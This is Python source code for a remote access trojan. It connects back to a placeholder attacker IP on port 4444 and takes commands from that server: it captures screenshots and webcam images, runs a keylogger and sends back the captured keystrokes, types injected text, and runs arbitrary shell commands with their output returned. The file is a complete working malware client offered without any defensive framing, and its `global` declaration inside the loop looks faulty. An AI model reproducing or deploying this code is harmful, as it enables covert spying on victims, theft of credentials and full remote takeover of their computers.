import socket
import subprocess
import os
import pyautogui
import cv2
from pynput import keyboard
from pynput.keyboard import Controller as KeyController
import threading

keylogger_data = ""
logging = False
keyboard_controller = KeyController()

def on_press(key):
    global keylogger_data
    try:
        keylogger_data += key.char
    except AttributeError:
        keylogger_data += f" [{key}] "

def start_keylogger():
    global logging
    if not logging:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        logging = True

def connect_to_server():
    host = 'YOUR_ATTACKER_IP'  # Replace with your attacker's IP
    port = 4444

    client = socket.socket()
    client.connect((host, port))

    while True:
        command = client.recv(1024).decode()

        if command == "exit":
            break

        elif command == "screenshot":
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
            client.send(b"[+] Screenshot saved.")

        elif command == "webcam":
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cv2.imwrite("webcam.jpg", frame)
            cap.release()
            client.send(b"[+] Webcam image saved.")

        elif command == "start_keylogger":
            start_keylogger()
            client.send(b"[+] Keylogger started.")

        elif command == "get_keys":
            global keylogger_data
            client.send(keylogger_data.encode())
            keylogger_data = ""

        elif command.startswith("type:"):
            text = command[5:]
            keyboard_controller.type(text)
            client.send(f"[+] Typed: {text}".encode())

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                client.send(output)
            except Exception as e:
                client.send(str(e).encode())

    client.close()

connect_to_server()
